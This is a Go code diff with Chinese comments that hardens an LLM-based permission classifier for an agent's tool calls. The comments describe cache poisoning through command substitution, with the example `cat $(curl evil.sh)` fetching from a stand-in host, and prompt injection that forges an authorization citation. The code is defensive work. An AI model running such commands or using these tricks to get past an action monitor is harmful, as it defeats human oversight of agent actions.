@@ -131,6 +131,13 @@ type classifierOutput struct {
 // canonicalInput 产出归一化结构的规范文本：shell 工具用 AST 拆段渲染
 // （结构是判定锚点，也压缩了提示注入的操作面），其余工具用原始入参。
 // 它同时是缓存键与 prompt 的结构段来源。
+//
+// Inner（命令替换/复合命令内嵌的调用）必须一并渲染：替换词在段内已塌缩
+// 为 "$…" 占位，若 Inner 不进结构，`cat $(ls)` 与 `cat $(curl evil.sh)`
+// 的归一化文本完全相同——第一次的判定会被第二次直接从缓存复用，替换
+// 内容从未被分类（缓存投毒）。参数展开（$var）没有 Inner 可渲染，但
+// 塌缩共享键在语义上可接受：`cat $a` 与 `cat $b` 同属"对未知变量做
+// cat"的风险类，分类器本来也只能按这个粒度判。
 func canonicalInput(req Request) string {
 	if IsShellTool(req.ToolName) {
 		if rep := AnalyzeShell(req.Input); rep.Parsed {
@@ -138,6 +145,15 @@ func canonicalInput(req Request) string {
 			for _, seg := range rep.Segments {
 				b.WriteString(seg.Command)
 				for _, a := range seg.Args {
+					b.WriteByte(' ')
+					b.WriteString(a)
+				}
+				b.WriteByte(';')
+			}
+			for _, in := range rep.Inner {
+				b.WriteString("<inner>")
+				b.WriteString(in.Command)
+				for _, a := range in.Args {
 					b.WriteByte(' ')
 					b.WriteString(a)
 				}
@@ -177,6 +193,33 @@ func (s *ClassifierStage) Evaluate(ctx context.Context, req Request) (DecisionRe
 	return res, true, nil
 }
 
+// grantClauses 把授权边界切分为子句（"；"、"。"、";"、换行）。子句是
+// "一条具体授权"的粒度——matched_grant 的引用必须落在这个粒度上，
+// 而不是边界文本的任意子串：strings.Contains(boundary, grant) 会放过
+// "允许"这类两字片段，注入只需诱导模型引用任意碎片即可伪造授权。
+func grantClauses(boundary string) []string {
+	f := strings.FieldsFunc(boundary, func(r rune) bool {
+		return r == '；' || r == '。' || r == ';' || r == '\n'
+	})
+	clauses := make([]string, 0, len(f))
+	for _, c := range f {
+		if c = strings.TrimSpace(c); c != "" {
+			clauses = append(clauses, c)
+		}
+	}
+	return clauses
+}
+
+// validGrantCitation 报告 grant 是否引用了边界中的至少一条完整授权子句。
+func validGrantCitation(boundary, grant string) bool {
+	for _, clause := range grantClauses(boundary) {
+		if strings.Contains(grant, clause) {
+			return true
+		}
+	}
+	return false
+}
+
 // resultFrom 把分类器输出翻译为决策，落实验收口径 3（allow 100% 携带
 // 有效 matched_grant，否则按 ask 统计）。
 func (s *ClassifierStage) resultFrom(out classifierOutput) DecisionResult {
@@ -188,7 +231,7 @@ func (s *ClassifierStage) resultFrom(out classifierOutput) DecisionResult {
 	switch strings.ToLower(strings.TrimSpace(out.Decision)) {
 	case "allow":
 		grant := strings.TrimSpace(out.MatchedGrant)
-		if grant != "" && strings.Contains(s.Opt.GrantBoundary, grant) {
+		if grant != "" && validGrantCitation(s.Opt.GrantBoundary, grant) {
 			res.Decision, res.Risk = Allow, RiskLow
 			res.Reason = "authorized by grant: " + grant
 			return res
@@ -213,7 +256,12 @@ func (s *ClassifierStage) lookupCache(key string) (DecisionResult, bool) {
 	s.mu.Lock()
 	defer s.mu.Unlock()
 	e, ok := s.cache[key]
-	if !ok || time.Now().After(e.expire) {
+	if !ok {
+		return DecisionResult{}, false
+	}
+	if time.Now().After(e.expire) {
+		// 过期即删：缓存只增不删会让长驻 worker 的 map 无界增长。
+		delete(s.cache, key)
 		return DecisionResult{}, false
 	}
 	return e.result, true
@@ -225,7 +273,16 @@ func (s *ClassifierStage) storeCache(key string, res DecisionResult) {
 	if s.cache == nil {
 		s.cache = make(map[string]classifierCacheEntry)
 	}
-	s.cache[key] = classifierCacheEntry{result: res, expire: time.Now().Add(s.Opt.cacheTTL())}
+	// 借写入时机清扫过期条目：键是 Run 级的，Run 结束后对应条目不会再被
+	// 访问，只靠读取路径删除会永久泄漏。写入频率即 LLM 调用频率（秒级），
+	// O(n) 扫描可接受。
+	now := time.Now()
+	for k, e := range s.cache {
+		if now.After(e.expire) {
+			delete(s.cache, k)
+		}
+	}
+	s.cache[key] = classifierCacheEntry{result: res, expire: now.Add(s.Opt.cacheTTL())}
 }
 
 // classify 发起一次分类调用并解析输出。
